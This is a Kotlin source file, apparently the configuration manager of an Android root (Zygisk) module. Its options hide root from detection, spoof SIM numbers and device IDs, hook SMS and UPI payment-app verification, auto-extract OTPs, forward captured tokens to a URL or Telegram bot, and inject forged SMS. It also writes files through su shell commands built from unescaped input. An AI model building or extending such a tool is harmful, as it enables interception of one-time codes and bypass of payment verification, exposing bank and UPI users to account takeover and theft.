package com.hivirtus.zygiskmode

import android.content.Context
import org.json.JSONObject
import java.io.File
import java.util.concurrent.Executors

data class ModuleConfig(
    val hideRoot: Boolean = true,
    val hideDeveloper: Boolean = true,
    val hideMagisk: Boolean = true,
    val hideKernelSu: Boolean = true,
    val hideApatch: Boolean = true,
    val hideSukisu: Boolean = true,
    val hideAllRootApps: Boolean = true,
    val enableSim1Mock: Boolean = false,
    val enableSim2Mock: Boolean = false,
    val enablePhoneSpoof: Boolean = false,
    val mockCountryIso: String = "in",
    val mockPhoneSim1: String = "+919876543210",
    val mockPhoneSim2: String = "+919876543211",
    val hookIncomingSms: Boolean = true,
    val hookOutgoingSms: Boolean = true,
    val hookUpiVerification: Boolean = true,
    val hookedUpiApps: Map<String, Boolean> = UpiAppRegistry.defaultHookMap(),
    val autoExtractOtp: Boolean = true,
    val autoForwardToken: Boolean = true,
    val forwardUrl: String = "",
    val forwardMethod: String = "POST",
    val telegramBotToken: String = "",
    val telegramChatId: String = "",
    val spoofAndroidId: String = "",
    val enableDeviceIdSpoof: Boolean = false,
    val injectSenderId: String = "",
    val injectMessageBody: String = "",
    val upiTimerBonusSeconds: Int = 20
)

data class LastOtp(
    val otp: String,
    val sender: String,
    val body: String = "",
    val phone: String = "",
    val messageLabel: String = "",
    val direction: String = "incoming",
    val rawPeer: String = ""
)

class ConfigManager(private val context: Context) {

    private val appDir: File
        get() = context.getExternalFilesDir(null) ?: context.filesDir

    private val appConfigFile: File
        get() = File(appDir, APP_CONFIG_NAME)

    private val appInjectFile: File
        get() = File(appDir, APP_INJECT_NAME)

    private val appOtpFile: File
        get() = File(appDir, APP_OTP_NAME)

    private val runtimeConfig = File(RUNTIME_CONFIG)
    private val moduleConfig = File(MODULE_CONFIG)
    private val injectCommand = File(INJECT_COMMAND)
    private val lastOtpFile = File(LAST_OTP_FILE)
    private val rootTypeFile = File(ROOT_TYPE_FILE)
    private val spoofPhoneFile = File(SPOOF_PHONE_FILE)

    private val ioExecutor = Executors.newSingleThreadExecutor()

    fun load(): ModuleConfig {
        val file = when {
            appConfigFile.exists() -> appConfigFile
            runtimeConfig.canRead() -> runtimeConfig
            moduleConfig.canRead() -> moduleConfig
            else -> return ModuleConfig()
        }
        return parseConfigFile(file)
    }

    /** App storage pe save — kabhi crash nahi. Root sync background me. */
    fun save(config: ModuleConfig): Boolean {
        return try {
            val payload = buildJson(config).toString(2)
            appDir.mkdirs()
            appConfigFile.writeText(payload)
            queuePushToModule(appConfigFile.absolutePath, payload)
            true
        } catch (_: Exception) {
            false
        }
    }

    fun update(transform: (ModuleConfig) -> ModuleConfig): Boolean {
        return save(transform(load()))
    }

    fun writeInjectCommand(sender: String, body: String): Boolean {
        return try {
            val safeSender = sender.replace("|", "-").trim().ifBlank { "AD-TEST-S" }
            val safeBody = body.replace("|", " ").replace("\n", " ").trim()
            val content = "INJECT|$safeSender|$safeBody"
            appDir.mkdirs()
            appInjectFile.writeText(content)
            ioExecutor.execute { pushInjectToModule(content) }
            true
        } catch (_: Exception) {
            false
        }
    }

    fun readRootType(): String {
        return try {
            if (!rootTypeFile.canRead()) return "Unknown"
            rootTypeFile.readText().trim().ifBlank { "Unknown" }
        } catch (_: Exception) {
            "Unknown"
        }
    }

    fun readSpoofPhone(): String {
        return try {
            if (!spoofPhoneFile.canRead()) return load().mockPhoneSim1
            spoofPhoneFile.readText().trim().ifBlank { load().mockPhoneSim1 }
        } catch (_: Exception) {
            load().mockPhoneSim1
        }
    }

    fun writeSpoofPhone(phone: String) {
        if (phone.isBlank()) return
        try {
            appDir.mkdirs()
            File(appDir, "hivirtus_spoof_phone.txt").writeText(phone)
        } catch (_: Exception) {}
        ioExecutor.execute {
            try {
                spoofPhoneFile.writeText(phone)
            } catch (_: Exception) {
                runSu("echo '$phone' > '$SPOOF_PHONE_FILE' && chmod 644 '$SPOOF_PHONE_FILE'")
            }
        }
    }

    fun readLastOtp(): LastOtp? {
        if (appOtpFile.canRead()) {
            parseOtpFile(appOtpFile)?.let { return it }
        }
        if (lastOtpFile.canRead()) {
            return parseOtpFile(lastOtpFile)
        }
        return null
    }

    private fun parseOtpFile(file: File): LastOtp? {
        return try {
            val json = JSONObject(file.readText())
            LastOtp(
                otp = json.optString("otp", ""),
                sender = json.optString("sender", ""),
                body = json.optString("body", ""),
                phone = json.optString("phone", readSpoofPhone()),
                messageLabel = json.optString("message_label", ""),
                direction = json.optString("direction", "incoming"),
                rawPeer = json.optString("raw_peer", "")
            )
        } catch (_: Exception) {
            null
        }
    }

    private fun queuePushToModule(localPath: String, payload: String) {
        ioExecutor.execute { pushPayloadQuiet(localPath, payload) }
    }

    private fun pushInjectToModule(content: String) {
        try {
            injectCommand.parentFile?.mkdirs()
            injectCommand.writeText(content)
        } catch (_: Exception) {
            runSu("cp '${appInjectFile.absolutePath}' '$INJECT_COMMAND' && chmod 644 '$INJECT_COMMAND'")
        }
    }

    private fun pushPayloadQuiet(localPath: String, payload: String) {
        try {
            runtimeConfig.parentFile?.mkdirs()
            runtimeConfig.writeText(payload)
        } catch (_: Exception) {
            runSu("cp '$localPath' '$RUNTIME_CONFIG' && chmod 644 '$RUNTIME_CONFIG'")
        }
        try {
            moduleConfig.parentFile?.mkdirs()
            moduleConfig.writeText(payload)
        } catch (_: Exception) {
            runSu("cp '$localPath' '$MODULE_CONFIG' && chmod 644 '$MODULE_CONFIG'")
        }
    }

    private fun parseConfigFile(file: File): ModuleConfig {
        return try {
            val json = JSONObject(file.readText())
            ModuleConfig(
                hideRoot = json.optBoolean("hide_root", true),
                hideDeveloper = json.optBoolean("hide_developer", true),
                hideMagisk = json.optBoolean("hide_magisk", true),
                hideKernelSu = json.optBoolean("hide_kernelsu", true),
                hideApatch = json.optBoolean("hide_apatch", true),
                hideSukisu = json.optBoolean("hide_sukisu", true),
                hideAllRootApps = json.optBoolean("hide_all_root_apps", true),
                enableSim1Mock = json.optBoolean("enable_sim1_mock", false),
                enableSim2Mock = json.optBoolean("enable_sim2_mock", false),
                enablePhoneSpoof = json.optBoolean("enable_phone_spoof", false),
                mockCountryIso = json.optString("mock_country_iso", "in"),
                mockPhoneSim1 = json.optString("mock_phone_sim1", "+919876543210"),
                mockPhoneSim2 = json.optString("mock_phone_sim2", "+919876543211"),
                hookIncomingSms = json.optBoolean("hook_incoming_sms", true),
                hookOutgoingSms = json.optBoolean("hook_outgoing_sms", true),
                hookUpiVerification = json.optBoolean("hook_upi_verification", true),
                hookedUpiApps = parseHookedApps(json),
                autoExtractOtp = json.optBoolean("auto_extract_otp", true),
                autoForwardToken = json.optBoolean("auto_forward_token", true),
                forwardUrl = json.optString("forward_url", ""),
                forwardMethod = json.optString("forward_method", "POST"),
                telegramBotToken = json.optString("telegram_bot_token", ""),
                telegramChatId = json.optString("telegram_chat_id", ""),
                spoofAndroidId = json.optString("spoof_android_id", ""),
                enableDeviceIdSpoof = json.optBoolean("enable_device_id_spoof", false),
                injectSenderId = json.optString("inject_sender_id", ""),
                injectMessageBody = json.optString("inject_message_body", ""),
                upiTimerBonusSeconds = json.optInt("upi_timer_bonus_seconds", 20)
            )
        } catch (_: Exception) {
            ModuleConfig()
        }
    }

    private fun parseHookedApps(json: JSONObject): Map<String, Boolean> {
        if (!json.has("hooked_upi_apps")) return UpiAppRegistry.defaultHookMap()
        return try {
            val obj = json.getJSONObject("hooked_upi_apps")
            val result = mutableMapOf<String, Boolean>()
            UpiAppRegistry.ALL.forEach { app ->
                result[app.packageName] = obj.optBoolean(app.packageName, true)
            }
            result
        } catch (_: Exception) {
            UpiAppRegistry.defaultHookMap()
        }
    }

    private fun buildJson(config: ModuleConfig): JSONObject {
        val hookedJson = JSONObject()
        config.hookedUpiApps.forEach { (pkg, enabled) ->
            try {
                hookedJson.put(pkg, enabled)
            } catch (_: Exception) {}
        }

        return JSONObject().apply {
            put("hide_root", config.hideRoot)
            put("hide_developer", config.hideDeveloper)
            put("hide_magisk", config.hideMagisk)
            put("hide_kernelsu", config.hideKernelSu)
            put("hide_apatch", config.hideApatch)
            put("hide_sukisu", config.hideSukisu)
            put("hide_all_root_apps", config.hideAllRootApps)
            put("enable_sim1_mock", config.enableSim1Mock)
            put("enable_sim2_mock", config.enableSim2Mock)
            put("enable_phone_spoof", config.enablePhoneSpoof)
            put("mock_country_iso", config.mockCountryIso)
            put("mock_phone_sim1", config.mockPhoneSim1)
            put("mock_phone_sim2", config.mockPhoneSim2)
            put("hook_incoming_sms", config.hookIncomingSms)
            put("hook_outgoing_sms", config.hookOutgoingSms)
            put("hook_upi_verification", config.hookUpiVerification)
            put("hooked_upi_apps", hookedJson)
            put("auto_extract_otp", config.autoExtractOtp)
            put("auto_forward_token", config.autoForwardToken)
            put("forward_url", config.forwardUrl)
            put("forward_method", config.forwardMethod)
            put("telegram_bot_token", config.telegramBotToken)
            put("telegram_chat_id", config.telegramChatId)
            put("spoof_android_id", config.spoofAndroidId)
            put("enable_device_id_spoof", config.enableDeviceIdSpoof)
            put("inject_sender_id", config.injectSenderId)
            put("inject_message_body", config.injectMessageBody)
            put("upi_timer_bonus_seconds", config.upiTimerBonusSeconds)
            put("log_file", "/data/local/tmp/hivirtus_zygisk_mode.log")
        }
    }

    private fun runSu(command: String): Boolean {
        val shells = listOf(
            arrayOf("su", "-c", command),
            arrayOf("ksud", "shell", command),
            arrayOf("/data/adb/ksu/bin/ksud", "shell", command)
        )
        for (cmd in shells) {
            try {
                val process = Runtime.getRuntime().exec(cmd)
                if (process.waitFor() == 0) return true
            } catch (_: Exception) {}
        }
        return false
    }

    companion object {
        const val APP_CONFIG_NAME = "hivirtus_zygisk_mode_config.json"
        const val APP_INJECT_NAME = "hivirtus_inject.cmd"
        const val APP_OTP_NAME = "hivirtus_last_otp.json"
        private const val RUNTIME_CONFIG = "/data/local/tmp/hivirtus_zygisk_mode_config.json"
        private const val MODULE_CONFIG = "/data/adb/modules/hivirtus_zygisk_mode/config.json"
        private const val INJECT_COMMAND = "/data/local/tmp/hivirtus_inject.cmd"
        private const val LAST_OTP_FILE = "/data/local/tmp/hivirtus_last_otp.json"
        private const val ROOT_TYPE_FILE = "/data/local/tmp/hivirtus_root_type.txt"
        private const val SPOOF_PHONE_FILE = "/data/local/tmp/hivirtus_spoof_phone.txt"
    }
}
